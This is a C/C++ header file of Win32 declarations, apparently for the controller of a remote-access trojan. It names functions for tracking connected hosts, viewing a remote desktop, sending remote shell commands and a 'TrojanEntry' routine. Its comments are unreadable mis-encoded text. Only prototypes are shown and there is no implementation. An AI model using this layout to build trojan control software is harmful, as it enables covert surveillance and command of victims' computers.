#pragma once
#include "Header.h"

extern HWND hDelList;
//����������
BOOL InsertNewItem(SOCKET s,SOCKADDR_IN sin);
//��ʼ��ListControl�ؼ�
BOOL InitListControl(HWND hListControl);
//���������б�
BOOL RefreshListControl(HWND hListControl,int dwDel);
//����⼦��������
char* GetHostName(SOCKADDR_IN sin,char* szHost);
//��������
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize);
//��������
BOOL RecvCmd(SOCKET sockfd);
//SOCKET������,MainFunc.H�� ��������
BOOL SocketError(SOCKET sockfd);
//��������
BOOL DispatchCmd(SOCKET sockfd,int dwRecvSize);
//����Զ����������
BOOL DeskViewRequest(SOCKET sockfd, HWND hDlg);
//��������
BOOL RecvBmpView(SOCKET sockfd, HWND hDlg);
//Bmp��ʾ
BOOL DisplayDeskView(HWND hDlg, char* pData);
//���ƽ��չ̶���������
BOOL RecvData(SOCKET sockfd, char* pData, int dwSize);
//����Զ��CMD����Ҫ��
BOOL CmdRequest(SOCKET sockfd, HWND hDlg);
//����CMD�������Ϣ
BOOL CmdReply(SOCKET sockfd, int dwRecvSize);
//ľ���̳߳�ʼ��
BOOL TrojanEntry(void);
//���߶˿ڼ���
BOOL ListenProc(int port);

